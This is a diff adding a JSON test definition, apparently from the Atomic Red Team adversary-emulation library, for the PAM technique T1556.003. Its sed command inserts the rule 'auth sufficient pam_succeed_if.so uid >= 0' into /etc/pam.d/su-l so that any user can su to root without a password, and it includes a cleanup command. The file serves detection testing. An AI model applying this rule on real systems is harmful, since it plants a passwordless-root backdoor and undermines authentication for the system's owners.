@@ -1,0 +1,43 @@
+{
+    "name": "Malicious PAM rule",
+    "description": "Inserts a rule into a PAM config and then tests it.  Upon successful execution, this test will insert a rule that allows every user to su to root without a password. ",
+    "supported_platforms": [
+        "linux"
+    ],
+    "executor": {
+        "name": "sh",
+        "elevation_required": true,
+        "command": "sudo sed -i \"#{index}s,^,#{pam_rule}\\n,g\" #{path_to_pam_conf}\n",
+        "cleanup_command": "sudo sed -i \"\\,#{pam_rule},d\" #{path_to_pam_conf}\n",
+        "type": "Command Executor"
+    },
+    "id": "T1556.003",
+    "tactics": [
+        "Persistence",
+        "Defense Evasion",
+        "Credential Access"
+    ],
+    "technique": "Pluggable Authentication Modules",
+    "source": "ART",
+    "uuid": "4b9dde80-ae22-44b1-a82a-644bf009eb9c",
+    "arguments": {
+        "path_to_pam_conf": {
+            "description": "PAM config file to modify.",
+            "type": "string",
+            "default": "/etc/pam.d/su-l"
+        },
+        "pam_rule": {
+            "description": "Rule to add to the PAM config.",
+            "type": "string",
+            "default": "auth sufficient pam_succeed_if.so uid >= 0"
+        },
+        "index": {
+            "description": "Index where the rule is inserted.",
+            "type": "integer",
+            "default": 1
+        }
+    },
+    "preconditions": [],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
